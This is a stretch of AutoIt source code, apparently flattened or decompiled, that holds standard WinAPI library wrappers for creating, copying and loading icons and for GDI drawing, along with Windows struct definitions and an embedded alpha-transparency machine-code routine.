        Local $tbitmap, $hdib = 0x0, $hresult = 0x0
        Local $ahbitmap[0x2]
        Local $ticoninfo = DllStructCreate($TAGICONINFO)
        Local $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        For $i = 0x0 To 0x1
            $ahbitmap[$i] = DllStructGetData($ticoninfo, $i + 0x4)
        Next
        Local $ierror = 0x0
        Do
            $hdib = _WinAPI_CopyBitmap($ahbitmap[0x1])
            If Not $hdib Then
                $ierror = 0x14
                ExitLoop
            EndIf
            $tbitmap = DllStructCreate($TAGBITMAP)
            If (Not _WinAPI_GetObject($hdib, DllStructGetSize($tbitmap), $tbitmap)) Or (DllStructGetData($tbitmap, "bmBitsPixel") <> 0x20) Then
                $ierror = 0x15
                ExitLoop
            EndIf
            $acall = DllCall("user32.dll", "lresult", "CallWindowProc", "PTR", __TransparencyProc(), "hwnd", 0x0, "uint", $ipercent, "wparam", DllStructGetPtr($tbitmap), "lparam", 0x0)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
            If $acall[0x0] = + -1 Then
                $hresult = _WinAPI_CreateEmptyIcon(DllStructGetData($tbitmap, "bmWidth"), DllStructGetData($tbitmap, "bmHeight"))
            Else
                $hresult = _WinAPI_CreateIconIndirect($hdib, $ahbitmap[0x0])
            EndIf
            If Not $hresult Then $ierror = 0x16
        Until 0x1
        If $hdib Then
            _WinAPI_DeleteObject($hdib)
        EndIf
        For $i = 0x0 To 0x1
            If $ahbitmap[$i] Then
                _WinAPI_DeleteObject($ahbitmap[$i])
            EndIf
        Next
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        If $bdelete Then
            _WinAPI_DestroyIcon($hicon)
        EndIf
        Return $hresult
    EndFunc    ; -> _WinAPI_AddIconTransparency

    Func _WinAPI_CopyIcon($hicon)
        Local $acall = DllCall("user32.dll", "handle", "CopyIcon", "handle", $hicon)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CopyIcon

    Func _WinAPI_Create32BitHICON($hicon, $bdelete = False)
        Local $ahbitmap[0x2], $hresult = 0x0
        Local $adib[0x2][0x2] = [[0x0, 0x0], [0x0, 0x0]]
        Local $ticoninfo = DllStructCreate($TAGICONINFO)
        Local $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        For $i = 0x0 To 0x1
            $ahbitmap[$i] = DllStructGetData($ticoninfo, $i + 0x4)
        Next
        If _WinAPI_IsAlphaBitmap($ahbitmap[0x1]) Then
            $adib[0x0][0x0] = _WinAPI_CreateANDBitmap($ahbitmap[0x1])
            If Not @error Then
                $hresult = _WinAPI_CreateIconIndirect($ahbitmap[0x1], $adib[0x0][0x0])
            EndIf
        Else
            Local $tsize = _WinAPI_GetBitmapDimension($ahbitmap[0x1])
            Local $asize[0x2]
            For $i = 0x0 To 0x1
                $asize[$i] = DllStructGetData($tsize, $i + 0x1)
            Next
            Local $hsrcdc = _WinAPI_CreateCompatibleDC(0x0)
            Local $hdstdc = _WinAPI_CreateCompatibleDC(0x0)
            Local $hsrcsv, $hdstsv
            For $i = 0x0 To 0x1
                $adib[$i][0x0] = _WinAPI_CreateDIB($asize[0x0], $asize[0x1])
                $adib[$i][0x1] = $__g_vext
                $hsrcsv = _WinAPI_SelectObject($hsrcdc, $ahbitmap[$i])
                $hdstsv = _WinAPI_SelectObject($hdstdc, $adib[$i][0x0])
                _WinAPI_BitBlt($hdstdc, 0x0, 0x0, $asize[0x0], $asize[0x1], $hsrcdc, 0x0, 0x0, 0xc000ca)
                _WinAPI_SelectObject($hsrcdc, $hsrcsv)
                _WinAPI_SelectObject($hdstdc, $hdstsv)
            Next
            _WinAPI_DeleteDC($hsrcdc)
            _WinAPI_DeleteDC($hdstdc)
            $acall = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", __XORProc(), "ptr", 0x0, "uint", $asize[0x0] * $asize[0x1] * 0x4, "wparam", $adib[0x0][0x1], "lparam", $adib[0x1][0x1])
            If Not @error And $acall[0x0] Then
                $hresult = _WinAPI_CreateIconIndirect($adib[0x1][0x0], $ahbitmap[0x0])
            EndIf
        EndIf
        For $i = 0x0 To 0x1
            _WinAPI_DeleteObject($ahbitmap[$i])
            If $adib[$i][0x0] Then
                _WinAPI_DeleteObject($adib[$i][0x0])
            EndIf
        Next
        If Not $hresult Then Return SetError(0xb, 0x0, 0x0)
        If $bdelete Then
            _WinAPI_DestroyIcon($hicon)
        EndIf
        Return $hresult
    EndFunc    ; -> _WinAPI_Create32BitHICON

    Func _WinAPI_CreateEmptyIcon($iwidth, $iheight, $ibitsperpel = 0x20)
        Local $hxor = _WinAPI_CreateDIB($iwidth, $iheight, $ibitsperpel)
        Local $hand = _WinAPI_CreateDIB($iwidth, $iheight, 0x1)
        Local $hdc = _WinAPI_CreateCompatibleDC(0x0)
        Local $hsv = _WinAPI_SelectObject($hdc, $hand)
        Local $hbrush = _WinAPI_CreateSolidBrush(0xffffff)
        Local $trect = _WinAPI_CreateRect(0x0, 0x0, $iwidth, $iheight)
        _WinAPI_FillRect($hdc, $trect, $hbrush)
        _WinAPI_DeleteObject($hbrush)
        _WinAPI_SelectObject($hdc, $hsv)
        _WinAPI_DeleteDC($hdc)
        Local $hicon = _WinAPI_CreateIconIndirect($hxor, $hand)
        Local $ierror = @error
        If $hxor Then
            _WinAPI_DeleteObject($hxor)
        EndIf
        If $hand Then
            _WinAPI_DeleteObject($hand)
        EndIf
        If Not $hicon Then Return SetError($ierror + 0xa, 0x0, 0x0)
        Return $hicon
    EndFunc    ; -> _WinAPI_CreateEmptyIcon

    Func _WinAPI_CreateIcon($hinstance, $iwidth, $iheight, $iplanes, $ibitspixel, $pandbits, $pxorbits)
        Local $acall = DllCall("user32.dll", "handle", "CreateIcon", "handle", $hinstance, "int", $iwidth, "int", $iheight, "byte", $iplanes, "byte", $ibitspixel, "struct*", $pandbits, "struct*", $pxorbits)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateIcon

    Func _WinAPI_CreateIconFromResourceEx($pdata, $isize, $bicon = True, $ixdesiredpixels = 0x0, $iydesiredpixels = 0x0, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "CreateIconFromResourceEx", "ptr", $pdata, "dword", $isize, "bool", $bicon, "dword", 0x30000, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateIconFromResourceEx

    Func _WinAPI_CreateIconIndirect($hbitmap, $hmask, $ixhotspot = 0x0, $iyhotspot = 0x0, $bicon = True)
        Local $ticoninfo = DllStructCreate($TAGICONINFO)
        DllStructSetData($ticoninfo, 0x1, $bicon)
        DllStructSetData($ticoninfo, 0x2, $ixhotspot)
        DllStructSetData($ticoninfo, 0x3, $iyhotspot)
        DllStructSetData($ticoninfo, 0x4, $hmask)
        DllStructSetData($ticoninfo, 0x5, $hbitmap)
        Local $acall = DllCall("user32.dll", "handle", "CreateIconIndirect", "struct*", $ticoninfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateIconIndirect

    Func _WinAPI_DestroyIcon($hicon)
        Local $acall = DllCall("user32.dll", "bool", "DestroyIcon", "handle", $hicon)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DestroyIcon

    Func _WinAPI_ExtractIcon($sicon, $iindex, $bsmall = False)
        Local $plarge, $psmall, $tptr = DllStructCreate("ptr")
        If $bsmall Then
            $plarge = 0x0
            $psmall = DllStructGetPtr($tptr)
        Else
            $plarge = DllStructGetPtr($tptr)
            $psmall = 0x0
        EndIf
        DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sicon, "int", $iindex, "ptr", $plarge, "ptr", $psmall, "uint", 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($tptr, 0x1)
    EndFunc    ; -> _WinAPI_ExtractIcon

    Func _WinAPI_ExtractIconEx($sfilepath, $iindex, $palarge, $pasmall, $iicons)
        Local $acall = DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sfilepath, "int", $iindex, "struct*", $palarge, "struct*", $pasmall, "uint", $iicons)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ExtractIconEx

    Func _WinAPI_FileIconInit($brestore = True)
        Local $acall = DllCall("shell32.dll", "int", 0x294, "int", $brestore)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_FileIconInit

    Func _WinAPI_GetIconDimension($hicon)
        Local $ticoninfo = DllStructCreate($TAGICONINFO)
        Local $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $tsize = _WinAPI_GetBitmapDimension(DllStructGetData($ticoninfo, 0x5))
        For $i = 0x4 To 0x5
            _WinAPI_DeleteObject(DllStructGetData($ticoninfo, $i))
        Next
        If Not IsDllStruct($tsize) Then Return SetError(0x14, 0x0, 0x0)
        Return $tsize
    EndFunc    ; -> _WinAPI_GetIconDimension

    Func _WinAPI_GetIconInfo($hicon)
        Local $tinfo = DllStructCreate($TAGICONINFO)
        Local $acall = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aicon[0x6]
        $aicon[0x0] = True
        $aicon[0x1] = DllStructGetData($tinfo, "Icon") <> 0x0
        $aicon[0x2] = DllStructGetData($tinfo, "XHotSpot")
        $aicon[0x3] = DllStructGetData($tinfo, "YHotSpot")
        $aicon[0x4] = DllStructGetData($tinfo, "hMask")
        $aicon[0x5] = DllStructGetData($tinfo, "hColor")
        Return $aicon
    EndFunc    ; -> _WinAPI_GetIconInfo

    Func _WinAPI_GetIconInfoEx($hicon)
        Local $tiiex = DllStructCreate("dword;int;dword;dword;ptr;ptr;ushort;wchar[260];wchar[260]")
        DllStructSetData($tiiex, 0x1, DllStructGetSize($tiiex))
        Local $acall = DllCall("user32.dll", "bool", "GetIconInfoExW", "handle", $hicon, "struct*", $tiiex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x8]
        For $i = 0x0 To 0x7
            $aret[$i] = DllStructGetData($tiiex, $i + 0x2)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetIconInfoEx

    Func _WinAPI_LoadIcon($hinstance, $sname)
        Local $stypeofname = "int"
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("user32.dll", "handle", "LoadIconW", "handle", $hinstance, $stypeofname, $sname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LoadIcon

    Func _WinAPI_LoadIconMetric($hinstance, $sname, $imetric)
        Local $stypeofname = "int"
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("comctl32.dll", "long", "LoadIconMetric", "handle", $hinstance, $stypeofname, $sname, "int", $imetric, "handle*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_LoadIconMetric

    Func _WinAPI_LoadIconWithScaleDown($hinstance, $sname, $iwidth, $iheight)
        Local $stypeofname = "int"
        If IsString($sname) Then
            $stypeofname = "wstr"
        EndIf
        Local $acall = DllCall("comctl32.dll", "long", "LoadIconWithScaleDown", "handle", $hinstance, $stypeofname, $sname, "int", $iwidth, "int", $iheight, "handle*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return $acall[0x5]
    EndFunc    ; -> _WinAPI_LoadIconWithScaleDown

    Func _WinAPI_LoadShell32Icon($iiconid)
        Local $ticons = DllStructCreate("ptr Data")
        Local $iicons = _WinAPI_ExtractIconEx("shell32.dll", $iiconid, 0x0, $ticons, 0x1)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $iicons <= 0x0 Then Return SetError(0xa, 0x0, 0x0)
        Return DllStructGetData($ticons, "Data")
    EndFunc    ; -> _WinAPI_LoadShell32Icon

    Func _WinAPI_LookupIconIdFromDirectoryEx($pdata, $bicon = True, $ixdesiredpixels = 0x0, $iydesiredpixels = 0x0, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "int", "LookupIconIdFromDirectoryEx", "ptr", $pdata, "bool", $bicon, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_LookupIconIdFromDirectoryEx

    Func _WinAPI_MirrorIcon($hicon, $bdelete = False)
        If Not $bdelete Then
            $hicon = _WinAPI_CopyIcon($hicon)
        EndIf
        Local $acall = DllCall("comctl32.dll", "int", 0x19e, "ptr", 0x0, "ptr*", $hicon)
        If @error Or Not $acall[0x0] Then
            Local $ierror = @error + 0xa
            If $hicon And Not $bdelete Then
                _WinAPI_DestroyIcon($hicon)
            EndIf
            Return SetError($ierror, 0x0, 0x0)
        EndIf
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_MirrorIcon

#EndRegion Public Functions
#Region Embedded DLL Functions
    Func __TransparencyProc()
        Static $pproc = 0x0
        If Not $pproc Then
            If @AutoItX64 Then
                $pproc = __Init(Binary("0x48894C240848895424104C894424184C894C24205541574831C0505050505050" & "4883EC284883BC24800000000074054831C0EB0748C7C0010000004821C07522" & "488BAC248000000048837D180074054831C0EB0748C7C0010000004821C07502" & "EB0948C7C001000000EB034831C04821C0740B4831C04863C0E93C0100004C63" & "7C24784983FF647E0F48C7C0010000004863C0E9220100004C637C24784D21FF" & "7D08C74424780000000048C74424280100000048C74424300000000048C74424" & "3800000000488BAC24800000004C637D04488BAC2480000000486345084C0FAF" & "F849C1E7024983C7FC4C3B7C24380F8C88000000488BAC24800000004C8B7D18" & "4C037C24384983C7034C897C2440488B6C2440480FB64500505888442448807C" & "244800744B4C0FB67C244848634424784C0FAFF84C89F848C7C1640000004899" & "48F7F94989C74C89F850488B6C244858884500488B6C2440807D0000740948C7" & "4424280000000048C7442430010000004883442438040F8149FFFFFF48837C24" & "3000741148837C242800740948C7C001000000EB034831C04821C0740E48C7C0" & "FFFFFFFF4863C0EB11EB0C48C7C0010000004863C0EB034831C04883C458415F" & "5DC3"))
            Else
                $pproc = __Init(Binary("0x555331C05050505050837C242800740431C0EB05B80100000021C075198B6C24" & "28837D1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021" & "C0740731C0E9E50000008B5C242483FB647E0AB801000000E9D20000008B5C24" & "2421DB7D08C744242400000000C7042401000000C744240400000000C7442408" & "000000008B6C24288B5D048B6C24280FAF5D08C1E30283C3FC3B5C24087C648B" & "6C24288B5D14035C240883C303895C240C8B6C240C0FB6450088442410807C24" & "100074380FB65C24100FAF5C242489D8B96400000099F7F989C3538B6C241058" & "8845008B6C240C807D00007407C7042400000000C74424040100000083442408" & "047181837C240400740D833C24007407B801000000EB0231C021C07409B8FFFF" & "FFFFEB0BEB07B801000000EB0231C083C4145B5DC21000"))
            EndIf
        EndIf
        Return $pproc
    EndFunc    ; -> __TransparencyProc

#EndRegion Embedded DLL Functions
#Region Global Variables and Constants
    Global Const $TAGBITMAPV4HEADER = "struct;dword bV4Size;long bV4Width;long bV4Height;ushort bV4Planes;ushort bV4BitCount;dword bV4Compression;dword bV4SizeImage;long bV4XPelsPerMeter;long bV4YPel" & _
        "sPerMeter;dword bV4ClrUsed;dword bV4ClrImportant;dword bV4RedMask;dword bV4GreenMask;dword bV4BlueMask;dword bV4AlphaMask;dword bV4CSType;int bV4Endpoints[9];dw" & _
        "ord bV4GammaRed;dword bV4GammaGreen;dword bV4GammaBlue;endstruct"
    Global Const $TAGCOLORADJUSTMENT = "ushort Size;ushort Flags;ushort IlluminantIndex;ushort RedGamma;ushort GreenGamma;ushort BlueGamma;ushort ReferenceBlack;ushort ReferenceWhite;short Contrast;sh" & _
        "ort Brightness;short Colorfulness;short RedGreenTint"
    Global Const $TAGDEVMODE = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;short Orientation;short PaperSize;short PaperLength;sho" & _
        "rt PaperWidth;short Scale;short Copies;short DefaultSource;short PrintQuality;short Color;short Duplex;short YResolution;short TTOption;short Collate;wchar Form" & _
        "Name[32];ushort Unused1;dword Unused2[3];dword Nup;dword Unused3;dword ICMMethod;dword ICMIntent;dword MediaType;dword DitherType;dword Reserved1;dword Reserved" & _
        "2;dword PanningWidth;dword PanningHeight"
    Global Const $TAGDEVMODE_DISPLAY = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;" & $TAGPOINT & ";dword DisplayOrientation;dword DisplayFixedOutput;short Unused1[5];wchar Unused2[32];ushort LogPixels;dword BitsPerPel;dword PelsWidth;dword PelsHeight;dword D" & _
        "isplayFlags;dword DisplayFrequency"
    Global Const $TAGDWM_COLORIZATION_PARAMETERS = "dword Color;dword AfterGlow;uint ColorBalance;uint AfterGlowBalance;uint BlurBalance;uint GlassReflectionIntensity; uint OpaqueBlend"
    Global Const $TAGENHMETAHEADER = "struct;dword Type;dword Size;long rcBounds[4];long rcFrame[4];dword Signature;dword Version;dword Bytes;dword Records;ushort Handles;ushort Reserved;dword Descr" & _
        "iption;dword OffDescription;dword PalEntries;long Device[2];long Millimeters[2];dword PixelFormat;dword OffPixelFormat;dword OpenGL;long Micrometers[2];endstruc" & _
        "t"
    Global Const $TAGEXTLOGPEN = "dword PenStyle;dword Width;uint BrushStyle;dword Color;ulong_ptr Hatch;dword NumEntries"
    Global Const $TAGFONTSIGNATURE = "dword fsUsb[4];dword fsCsb[2]"
    Global Const $TAGGLYPHMETRICS = "uint BlackBoxX;uint BlackBoxY;" & $TAGPOINT & ";short CellIncX;short CellIncY"
    Global Const $TAGLOGBRUSH = "uint Style;dword Color;ulong_ptr Hatch"
    Global Const $TAGLOGPEN = "uint Style;dword Width;dword Color"
    Global Const $TAGMAT2 = "short eM11[2];short eM12[2];short eM21[2];short eM22[2]"
    Global Const $TAGNEWTEXTMETRIC = $TAGTEXTMETRIC & ";dword ntmFlags;uint ntmSizeEM;uint ntmCellHeight;uint ntmAvgWidth"
    Global Const $TAGNEWTEXTMETRICEX = $TAGNEWTEXTMETRIC & ";" & $TAGFONTSIGNATURE
    Global Const $TAGPANOSE = "struct;byte bFamilyType;byte bSerifStyle;byte bWeight;byte bProportion;byte bContrast;byte bStrokeVariation;byte bArmStyle;byte bLetterform;byte bMidline;byte b" & _
        "XHeight;endstruct"
    Global Const $TAGOUTLINETEXTMETRIC = "struct;uint otmSize;" & $TAGTEXTMETRIC & ";byte otmFiller;" & $TAGPANOSE & ";byte bugFiller[3];uint otmSelection;uint otmType;int otmCharSlopeRise;int otmCharSlopeRun;int otmItalicAngle;uint otmEMSquare;int otmAscent;int otmDescent;uint" & _
        " otmLineGap;uint otmCapEmHeight;uint otmXHeight;long otmFontBox[4];int otmMacAscent;int otmMacDescent;uint otmMacLineGap;uint otmMinimumPPEM;long otmSubscriptSi" & _
        "ze[2];long otmSubscriptOffset[2];long otmSuperscriptSize[2];long otmSuperscriptOffse[2];uint otmStrikeoutSize;int otmStrikeoutPosition;int otmUnderscoreSize;int" & _
        " otmUnderscorePosition;uint_ptr otmFamilyName;uint_ptr otmFaceName;uint_ptr otmStyleName;uint_ptr otmFullName;endstruct"
    Global Const $TAGPAINTSTRUCT = "hwnd hDC;int fErase;dword rPaint[4];int fRestore;int fIncUpdate;byte rgbReserved[32]"
    Global Const $TAGRGNDATAHEADER = "struct;dword Size;dword Type;dword Count;dword RgnSize;" & $TAGRECT & ";endstruct"
    Global Const $TAGXFORM = "float eM11;float eM12;float eM21;float eM22;float eDx;float eDy"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_AbortPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "AbortPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AbortPath

    Func _WinAPI_AddFontMemResourceEx($pdata, $isize)
        Local $acall = DllCall("gdi32.dll", "handle", "AddFontMemResourceEx", "ptr", $pdata, "dword", $isize, "ptr", 0x0, "dword*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return SetExtended($acall[0x4], $acall[0x0])
    EndFunc    ; -> _WinAPI_AddFontMemResourceEx

    Func _WinAPI_AddFontResourceEx($sfont, $iflag = 0x0, $bnotify = False)
        Local $acall = DllCall("gdi32.dll", "int", "AddFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        If $bnotify Then
            Local Const $WM_FONTCHANGE = 0x1d
            Local Const $HWND_BROADCAST = 0xffff
            DllCall("user32.dll", "lresult", "SendMessage", "hwnd", $HWND_BROADCAST, "uint", $WM_FONTCHANGE, "wparam", 0x0, "lparam", 0x0)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AddFontResourceEx

    Func _WinAPI_AddIconOverlay($hicon, $hoverlay)
        Local $acall, $hresult = 0x0, $ierror = 0x0
        Local $ahdev[0x2] = [0x0, 0x0]
        Local $tsize = _WinAPI_GetIconDimension($hicon)
        Local $hil = DllCall("comctl32.dll", "handle", "ImageList_Create", "int", DllStructGetData($tsize, 0x1), "int", DllStructGetData($tsize, 0x2), "uint", 0x21, "int", 0x2, "int", 0x2)
        If @error Or Not $hil[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Do
            $ahdev[0x0] = _WinAPI_Create32BitHICON($hicon)
            If @error Then
                $ierror = @error + 0x64
                ExitLoop
            EndIf
            $acall = DllCall("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0x0], "int", + -1, "handle", $ahdev[0x0])
            If @error Or ($acall[0x0] = + -1) Then
                $ierror = @error + 0xc8
                ExitLoop
            EndIf
            $ahdev[0x1] = _WinAPI_Create32BitHICON($hoverlay)
            If @error Then
                $ierror = @error + 0x12c
                ExitLoop
            EndIf
            $acall = DllCall("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0x0], "int", + -1, "handle", $ahdev[0x1])
            If @error Or ($acall[0x0] = + -1) Then
                $ierror = @error + 0x190
                ExitLoop
            EndIf
            $acall = DllCall("comctl32.dll", "bool", "ImageList_SetOverlayImage", "handle", $hil[0x0], "int", 0x1, "int", 0x1)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x1f4
                ExitLoop
            EndIf
            $acall = DllCall("comctl32.dll", "handle", "ImageList_GetIcon", "handle", $hil[0x0], "int", 0x0, "uint", 0x100)
            If @error Or Not $acall[0x0] Then
                $ierror = @error + 0x258
                ExitLoop
            EndIf
            $hresult = $acall[0x0]
        Until 0x1
        DllCall("comctl32.dll", "bool", "ImageList_Destroy", "handle", $hil[0x0])
        For $i = 0x0 To 0x1
            If $ahdev[$i] Then
                _WinAPI_DestroyIcon($ahdev[$i])
            EndIf
        Next
        If Not $hresult Then Return SetError($ierror, 0x0, 0x0)
        Return $hresult
    EndFunc    ; -> _WinAPI_AddIconOverlay

    Func _WinAPI_AdjustBitmap($hbitmap, $iwidth, $iheight, $imode = 0x3, $tadjustment = 0x0)
        Local $tobj = DllStructCreate($TAGBITMAP)
        Local $acall = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        If $iwidth = + -1 Then
            $iwidth = DllStructGetData($tobj, "bmWidth")
        EndIf
        If $iheight = + -1 Then
            $iheight = DllStructGetData($tobj, "bmHeight")
        EndIf
        $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", 0x0)
        Local $hdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
        Local $hdestdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
        Local $hbmp = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
        Local $hdestsv = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
        Local $hsrcdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
        Local $hsrcsv = $acall[0x0]
        If _WinAPI_SetStretchBltMode($hdestdc, $imode) Then
            Switch $imode
            Case 0x4
                If IsDllStruct($tadjustment) Then
                    If Not _WinAPI_SetColorAdjustment($hdestdc, $tadjustment) Then
                    EndIf
                EndIf
            Case Else
            EndSwitch
        EndIf
        $acall = _WinAPI_StretchBlt($hdestdc, 0x0, 0x0, $iwidth, $iheight, $hsrcdc, 0x0, 0x0, DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"), 0xcc0020)
        DllCall("user32.dll", "int", "ReleaseDC", "hwnd", 0x0, "handle", $hdc)
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
        DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
        DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
        If Not $acall Then Return SetError(0xa, 0x0, 0x0)
        Return $hbmp
    EndFunc    ; -> _WinAPI_AdjustBitmap

    Func _WinAPI_AlphaBlend($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $ialpha, $balpha = False)
        Local $iblend = BitOR(BitShift(Not ($balpha = False), + -24), BitShift(BitAND($ialpha, 0xff), + -16))
        Local $acall = DllCall("gdi32.dll", "bool", "GdiAlphaBlend", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $iblend)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AlphaBlend

    Func _WinAPI_AngleArc($hdc, $ix, $iy, $iradius, $nstartangle, $nsweepangle)
        Local $acall = DllCall("gdi32.dll", "bool", "AngleArc", "handle", $hdc, "int", $ix, "int", $iy, "dword", $iradius, "float", $nstartangle, "float", $nsweepangle)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AngleArc

    Func _WinAPI_Arc($hdc, $trect, $ixstartarc, $iystartarc, $ixendarc, $iyendarc)
        Local $acall = DllCall("gdi32.dll", "bool", "Arc", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4), "int", $ixstartarc, "int", $iystartarc, "int", $ixendarc, "int", $iyendarc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_Arc

    Func _WinAPI_ArcTo($hdc, $trect, $ixradial1, $iyradial1, $ixradial2, $iyradial2)
        Local $acall = DllCall("gdi32.dll", "bool", "ArcTo", "handle", $hdc, "int", DllStructGetData($trect, 0x1), "int", DllStructGetData($trect, 0x2), "int", DllStructGetData($trect, 0x3), "int", DllStructGetData($trect, 0x4), "int", $ixradial1, "int", $iyradial1, "int", $ixradial2, "int", $iyradial2)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ArcTo

    Func _WinAPI_BeginPaint($hwnd, ByRef $tpaintstruct)
        $tpaintstruct = DllStructCreate($TAGPAINTSTRUCT)
        Local $acall = DllCall("user32.dll", "handle", "BeginPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BeginPaint

    Func _WinAPI_BeginPath($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "BeginPath", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BeginPath

    Func _WinAPI_CloseEnhMetaFile($hdc)
        Local $acall = DllCall("gdi32.dll", "handle", "CloseEnhMetaFile", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseEnhMetaFile

    Func _WinAPI_CloseFigure($hdc)
        Local $acall = DllCall("gdi32.dll", "bool", "CloseFigure", "handle", $hdc)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseFigure

